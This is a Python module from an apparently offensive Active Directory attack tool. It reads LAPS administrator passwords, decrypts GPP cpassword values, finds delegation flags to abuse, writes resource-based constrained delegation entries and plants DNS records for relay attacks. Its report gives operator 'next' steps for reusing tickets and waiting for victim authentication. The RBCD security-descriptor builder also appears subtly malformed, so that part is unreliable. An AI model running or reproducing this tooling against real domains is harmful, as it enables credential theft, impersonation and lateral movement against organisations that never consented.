# ============================================================================
# FILE: core/ad_hunt.py
# ============================================================================
"""What the directory gives away, and the two attributes worth writing.

Two halves, and both are the reason AD is the highest-value target in a Windows estate.

**Reads (no cracking, no noise).** LAPS puts the local administrator's password in the
directory, by design, for anyone with the read right. Group Policy Preferences left `cpassword`
in SYSVOL (MS14-025, 2014) with a key Microsoft published - those files are still there in
directories nobody cleaned. Unconstrained and constrained delegation are flags that let a
compromised host impersonate anyone who touches it. And passwords live in `description` and
`info` fields, because someone always types one there.

**Writes.** `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) is the mirror of shadow
credentials: it says "this principal may impersonate anyone to me", and one attribute value is
the whole change. `dnsNode` objects are the AD-integrated DNS zone, and writing one is how a
relay or a coercion gets a name the victim will resolve.

Nothing here brute-forces: every value comes back in one query, which is why it is worth having
and why the detection is an audit event rather than a traffic pattern.
"""
import re

from core import aes

__all__ = ["LAPS_ATTRS", "HUNT_ATTRS", "laps", "gpp", "gmsa", "delegation", "password_hunt",
           "rbcd_value", "rbcd_set", "dns_record", "dns_write", "report", "describe",
           "DELEGATION_FLAGS"]

# The attributes that carry a local administrator password (legacy LAPS and Windows LAPS).
LAPS_ATTRS = ("ms-Mcs-AdmPwd", "msLAPS-Password", "msLAPS-EncryptedPassword",
              "ms-Mcs-AdmPwdExpirationTime")

# What a hunt should ask for on a computer object.
HUNT_ATTRS = ("cn", "dNSHostName", "distinguishedName", "ms-Mcs-AdmPwd", "msLAPS-Password",
              "msLAPS-EncryptedPassword", "operatingSystem", "userAccountControl",
              "msDS-AllowedToDelegateTo", "servicePrincipalName", "description", "info")

# userAccountControl bits that change what a host or account can do to others.
DELEGATION_FLAGS = {
    0x00080000: ("TRUSTED_FOR_DELEGATION", "UNCONSTRAINED delegation: this host can impersonate "
                                           "any user who authenticates to it, to anywhere"),
    0x00100000: ("NOT_DELEGATED", "the account is protected from delegation"),
    0x01000000: ("TRUSTED_TO_AUTH_FOR_DELEGATION", "protocol transition: it can obtain a ticket "
                                                   "for a user without their password"),
}


def _first(attrs, name, default=""):
    value = (attrs or {}).get(name) or []
    if isinstance(value, str):
        return value
    return str(value[0]) if value else default


def _int(attrs, name):
    try:
        return int(_first(attrs, name, "0") or 0)
    except ValueError:
        return 0


def laps(rows, include_encrypted=False):
    """Every local administrator password the directory hands over, with its source attribute.

    `ms-Mcs-AdmPwd` is legacy LAPS (plaintext), `msLAPS-Password` is Windows LAPS (plaintext in
    the JSON blob), and `msLAPS-EncryptedPassword` is DPAPI-encrypted - which needs the machine's
    DPAPI key, so it is reported as present but NOT decrypted rather than guessed at.
    """
    out = []
    for row in rows or []:
        attrs = (row.get("attrs") if isinstance(row, dict) else None) or row or {}
        host = _first(attrs, "dNSHostName") or _first(attrs, "cn") or (row.get("dn") if
                                                                       isinstance(row, dict)
                                                                       else "")
        for attr in ("ms-Mcs-AdmPwd", "msLAPS-Password"):
            value = _first(attrs, attr)
            if value:
                password = value
                if attr == "msLAPS-Password" and value.strip().startswith("{"):
                    import json
                    try:
                        password = json.loads(value).get("p", value)
                    except ValueError:
                        password = value
                out.append({"host": host, "attribute": attr, "password": password,
                            "verdict": "CONFIRMED",
                            "why": f"{attr} is readable by this bind: the local administrator "
                                   "password is in the directory"})
        if include_encrypted and _first(attrs, "msLAPS-EncryptedPassword"):
            out.append({"host": host, "attribute": "msLAPS-EncryptedPassword", "password": "",
                        "verdict": "SUSPECTED",
                        "why": "a Windows LAPS encrypted password is present: decrypting it "
                               "needs the machine's DPAPI key (a different step), so it is "
                               "reported as present, not as recovered"})
    return out


def gpp(rows):
    """Group Policy Preferences `cpassword` values, decrypted with the published key.

    The GPP objects are in the directory (`gPCFileSysPath` points at the XML in SYSVOL); the
    `cpassword` inside those files is AES-256-CBC with a key Microsoft published in 2012. This
    reads whatever `cpassword` the rows carry and decrypts it - one query, no cracking.
    """
    out = []
    for row in rows or []:
        attrs = (row.get("attrs") if isinstance(row, dict) else None) or row or {}
        name = _first(attrs, "cn") or _first(attrs, "displayName") or ""
        for key in ("cpassword", "gpcUserSettings", "gpcComputerSettings"):
            blob = _first(attrs, key)
            for match in re.finditer(r'cpassword="([^"]+)"', str(blob)):
                try:
                    plain = aes.gpp_decrypt(match.group(1))
                except aes.AesError as e:
                    out.append({"gpo": name, "verdict": "FAILED", "password": "",
                                "why": f"the cpassword did not decrypt: {e}"})
                    continue
                out.append({"gpo": name, "attribute": key, "password": plain,
                            "verdict": "CONFIRMED",
                            "why": "MS14-025: the GPP cpassword decrypts with the key Microsoft "
                                   "published, so this password was never secret"})
    return out


def gmsa(rows):
    """Group Managed Service Account blobs: present, and honestly not decrypted.

    `msDS-ManagedPassword` is a blob encrypted with the domain's KDS root key. Reading the blob
    needs the same right as LAPS; DECRYPTING it needs the KDS key, which is a different step
    (and is why a gMSA is a better secret than a service account password).
    """
    out = []
    for row in rows or []:
        attrs = (row.get("attrs") if isinstance(row, dict) else None) or row or {}
        blob = _first(attrs, "msDS-ManagedPassword")
        if blob:
            out.append({"account": _first(attrs, "sAMAccountName") or _first(attrs, "cn"),
                        "blob_bytes": len(blob), "verdict": "SUSPECTED",
                        "why": "the managed password blob is readable, but decrypting it needs "
                               "the KDF root key from the directory's KDS (a separate step): "
                               "reported as present, not as recovered"})
    return out


def delegation(rows):
    """Hosts and accounts that can impersonate, and the flag or attribute that says so."""
    out = []
    for row in rows or []:
        attrs = (row.get("attrs") if isinstance(row, dict) else None) or row or {}
        uac = _int(attrs, "userAccountControl")
        name = _first(attrs, "dNSHostName") or _first(attrs, "sAMAccountName") or \
            _first(attrs, "cn")
        for flag, (label, why) in DELEGATION_FLAGS.items():
            if uac & flag and label == "TRUSTED_FOR_DELEGATION":
                out.append({"principal": name, "kind": label, "verdict": "CONFIRMED",
                            "why": why, "next": "any user who authenticates to this host has a "
                                                "usable TGS in its memory: collect and reuse"})
        targets = attrs.get("msDS-AllowedToDelegateTo") or []
        if targets:
            out.append({"principal": name, "kind": "CONSTRAINED", "verdict": "CONFIRMED",
                        "why": f"constrained delegation to: {', '.join(str(t) for t in targets[:5])}",
                        "next": "S4U2Self + S4U2Proxy against those services, no password needed"})
        if attrs.get("msDS-AllowedToActOnBehalfOfOtherIdentity"):
            out.append({"principal": name, "kind": "RBCD", "verdict": "CONFIRMED",
                        "why": "resource-based constrained delegation is already configured on "
                               "this object", "next": "see who is named, and whether it is you"})
    return out


def password_hunt(rows, extra_attrs=("description", "info", "comment", "userPassword",
                                     "unixUserPassword", "url", "otherHomePhone")):
    """Passwords typed into free-text fields, with the line they came from.

    Nothing here is a guess: the value is returned as it sits in the attribute, because "the
    description field contains what looks like a password" is a finding the operator can read,
    and a regex that decides for them is how a report becomes wrong.
    """
    pattern = re.compile(r"(pass|pwd|secret|key|token)", re.I)
    out = []
    for row in rows or []:
        attrs = (row.get("attrs") if isinstance(row, dict) else None) or row or {}
        who = _first(attrs, "sAMAccountName") or _first(attrs, "cn") or _first(attrs, "name")
        for attr in extra_attrs:
            value = _first(attrs, attr)
            if not value or len(str(value)) > 400:
                continue
            if attr in ("userPassword", "unixUserPassword"):
                out.append({"principal": who, "attribute": attr, "value": str(value)[:120],
                            "verdict": "CONFIRMED",
                            "why": "a password is stored in a directory attribute"})
            elif pattern.search(str(value)):
                out.append({"principal": who, "attribute": attr, "value": str(value)[:200],
                            "verdict": "SUSPECTED",
                            "why": "the field mentions a password and is readable: read it and "
                                   "decide, this is not a decoded value"})
    return out


def rbcd_value(principal_sid):
    """The security descriptor for `msDS-AllowedToActOnBehalfOfOtherIdentity`.

    A one-entry DACL that grants the named SID the right to impersonate to this object. It is
    the mirror of shadow credentials: one attribute, one write, and the principal can become
    anyone the object accepts.
    """
    from core.goldenticket import _sid_bytes
    sid = _sid_bytes(principal_sid)
    # SDDL: allow (A) the impersonation right (CCDCLCSWRPWPDTLOCRSDRCWDWO) to that SID
    body = b"\x01\x00\x04\x80"                       # revision, control: DACL present
    body += (24 + len(sid)).to_bytes(4, "little")    # offset to the DACL
    body += (0).to_bytes(4, "little") + (0).to_bytes(4, "little")   # no owner, no group
    ace = (b"\x00"                                  # ACE type: access allowed
           + b"\x00"                                # flags
           + (0x000F01FF).to_bytes(4, "little")     # full control
           + sid)
    body += b"\x01\x00" + (len(ace)).to_bytes(2, "little") + ace    # DACL: 1 ACE
    body += (0).to_bytes(4, "little")               # no SACL
    return body


def rbcd_set(client, target_dn, principal_sid, remove=False):
    """Write (or clear) RBCD on a target object."""
    if remove:
        return client.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": []},
                             operation=1)
    return client.modify(target_dn,
                         {"msDS-AllowedToActOnBehalfOfOtherIdentity":
                          [rbcd_value(principal_sid)]}, operation=2)


def dns_record(name, ip, zone_dn, record_type="A", ttl=600):
    """The attribute payload for an AD-integrated DNS record (`dnsNode`)."""
    if not str(name or "").strip():
        raise ValueError("a DNS record needs a name")
    if record_type != "A":
        raise ValueError("only A records are built here (the others need their own RDATA)")
    try:
        parts = [int(p) for p in str(ip).split(".")]
        if len(parts) != 4 or any(not 0 <= p <= 255 for p in parts):
            raise ValueError
    except ValueError as e:
        raise ValueError(f"not an IPv4 address: {ip!r}") from e
    rdata = bytes(parts)
    # DNS_RPC_RECORD: data length, type (A = 1), version, rank, flags, serial, ttl, then RDATA
    record = (len(rdata).to_bytes(2, "little") + (1).to_bytes(2, "little")
              + b"\x05\xf0"                          # version + rank (the values AD writes)
              + (0).to_bytes(2, "little") + (0).to_bytes(4, "little")
              + int(ttl).to_bytes(4, "little") + rdata)
    return {"dn": f"DC={name},{zone_dn}", "attrs": {"dnsRecord": [record],
                                                    "dnsTombstoned": ["FALSE"]}}


def dns_write(client, name, ip, zone_dn, ttl=600):
    """Add (or replace) an A record in an AD-integrated zone."""
    payload = dns_record(name, ip, zone_dn, ttl=ttl)
    return client.modify(payload["dn"], {"dnsRecord": payload["attrs"]["dnsRecord"]},
                         operation=2)


def report(laps_rows=None, gpp_rows=None, gmsa_rows=None, delegation_rows=None,
           text_rows=None):
    """One report: every read, labelled, with what to do about it."""
    found = {
        "laps": laps(laps_rows or [], include_encrypted=True),
        "gpp": gpp(gpp_rows or []),
        "gmsa": gmsa(gmsa_rows or []),
        "delegation": delegation(delegation_rows or []),
        "text": password_hunt(text_rows or []),
    }
    flat = [item for rows in found.values() for item in rows]
    return {
        "findings": found,
        "total": len(flat),
        "confirmed": len([f for f in flat if f["verdict"] == "CONFIRMED"]),
        "suspected": len([f for f in flat if f["verdict"] == "SUSPECTED"]),
        "failed": len([f for f in flat if f["verdict"] == "FAILED"]),
        "next": [
            "a LAPS password is a local administrator on that host: use it where the host is "
            "reachable, and note that the directory is the delivery mechanism, not a bug",
            "an unconstrained-delegation host holds a usable TGS for every user who "
            "authenticates to it: that is the collection, not a crack",
            "RBCD and shadow credentials are the same write: check which one the object "
            "already trusts before adding another",
            "an AD-integrated DNS record is how a relay or a coercion gets a name the victim "
            "resolves - write it, then wait for the authentication",
        ],
    }


def describe(facts):
    if "findings" in (facts or {}):
        lines = [f"directory hunt: {facts['total']} finding(s) "
                 f"({facts['confirmed']} CONFIRMED, {facts['suspected']} SUSPECTED, "
                 f"{facts['failed']} FAILED)"]
        for kind, rows in (facts.get("findings") or {}).items():
            for row in rows:
                who = row.get("host") or row.get("gpo") or row.get("principal") or \
                    row.get("account") or "?"
                lines.append(f"  [{row['verdict']:<9}] {kind:<10} {who}")
                if row.get("password"):
                    lines.append(f"      value: {row['password']}")
                lines.append(f"      {row['why']}")
        lines.append("  next:")
        for step in facts.get("next") or []:
            lines.append(f"    - {step}")
        return "\n".join(lines)
    return f"directory hunt: {facts}"
